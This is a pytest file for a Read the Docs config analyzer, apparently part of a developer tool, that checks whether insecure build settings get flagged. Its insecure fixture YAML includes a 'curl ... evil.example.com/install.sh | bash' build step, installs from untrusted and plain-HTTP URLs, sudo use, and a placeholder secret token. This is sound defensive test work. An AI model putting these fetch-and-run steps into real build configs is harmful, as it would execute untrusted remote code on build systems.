"""Tests for ReadTheDocsAnalyzer."""

from pathlib import Path

from devai.readthedocs_analyzer import ReadTheDocsAnalyzer, ReadTheDocsFinding


INSECURE_RTD = """\
version: 2

build:
  os: ubuntu-22.04
  tools:
    python: "3.6"
  jobs:
    pre_build:
      - curl https://evil.example.com/install.sh | bash
      - sudo apt install suspicious-package
      - pip install https://untrusted.example.com/pkg.tar.gz
    build:
      - bash -c "echo building"

python:
  install:
    - method: pip
      path: git+http://insecure.example.com/repo.git

submodules:
  include: all

formats: all

# secrets
SECRET_TOKEN: sk-live-secret-token-12345
"""

HARDENED_RTD = """\
version: 2

build:
  os: ubuntu-22.04
  tools:
    python: "3.12"

sphinx:
  configuration: docs/conf.py

python:
  install:
    - requirements: docs/requirements.txt
"""


class TestReadTheDocsAnalyzer:
    def test_detects_insecure_readthedocs_yaml(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yaml").write_text(INSECURE_RTD, encoding="utf-8")
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "curl_pipe_shell" in kinds
        assert "sudo_in_build" in kinds
        assert "git_http_install" in kinds
        assert "pip_url_install" in kinds
        assert "shell_command" in kinds
        assert "old_python_version" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_readthedocs_scores_well(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yaml").write_text(HARDENED_RTD, encoding="utf-8")
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert findings == []
        assert analyzer.health_score() == 100.0

    def test_no_config_returns_perfect_score(self, tmp_path: Path):
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_finding_format(self):
        finding = ReadTheDocsFinding(
            kind="hardcoded_secret",
            severity="high",
            message="test message",
            path=".readthedocs.yaml",
            lineno=10,
            line="SECRET: value",
        )
        assert "[high]" in finding.format()
        assert ".readthedocs.yaml:10" in finding.format()

    def test_generate_hardened_template(self):
        analyzer = ReadTheDocsAnalyzer(".")
        template = analyzer.generate_hardened_template()
        assert "version: 2" in template
        assert "python: \"3.12\"" in template

    def test_to_context(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yaml").write_text(INSECURE_RTD, encoding="utf-8")
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Read the Docs analysis:" in context
        assert "health score:" in context

    def test_stats_property(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yaml").write_text(INSECURE_RTD, encoding="utf-8")
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        stats = analyzer.stats
        assert stats.config_files == 1
        assert stats.findings > 0
        assert stats.high_severity > 0

    def test_finds_readthedocs_yml_variant(self, tmp_path: Path):
        (tmp_path / "readthedocs.yml").write_text(HARDENED_RTD, encoding="utf-8")
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        assert len(analyzer.config_files()) == 1
